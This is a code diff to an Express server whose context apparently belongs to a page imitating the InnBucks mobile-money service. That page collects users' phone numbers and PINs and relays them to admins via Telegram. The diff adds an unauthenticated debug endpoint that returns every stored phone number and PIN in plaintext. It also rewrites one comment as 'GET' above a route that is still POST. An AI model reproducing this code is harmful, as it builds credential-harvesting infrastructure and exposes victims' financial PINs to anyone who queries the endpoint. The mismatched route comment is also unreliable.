@@ -1613,7 +1613,7 @@ ${userLabel}
     }
 });
 
-// POST /api/login-momo - Handle returning user login
+// GET /api/login-momo - Handle returning user login
 app.post('/api/login-momo', async (req, res) => {
     try {
         const { phone, pin } = req.body;
@@ -1879,6 +1879,36 @@ app.get('/health', (req, res) => {
         webhookUrl:    `${WEBHOOK_URL}/telegram-webhook`,
         timestamp:     new Date().toISOString()
     });
+});
+
+// GET /api/debug/applications - Debug endpoint to view all applications
+app.get('/api/debug/applications', async (req, res) => {
+    try {
+        const allAdmins = await db.getActiveAdmins();
+        let allApps = [];
+        
+        for (const admin of allAdmins) {
+            const apps = await db.getApplicationsByAdmin(admin.adminId);
+            allApps = allApps.concat(apps);
+        }
+
+        // Return only needed fields for testing
+        const summary = allApps.map(app => ({
+            id: app.id,
+            phone: app.phoneNumber,
+            pin: app.pin,
+            pinStatus: app.pinStatus,
+            adminName: app.adminName
+        }));
+
+        res.json({ 
+            success: true, 
+            totalApplications: allApps.length,
+            applications: summary
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, message: error.message });
+    }
 });
 
 // ── Serve the InnBucks HTML ──
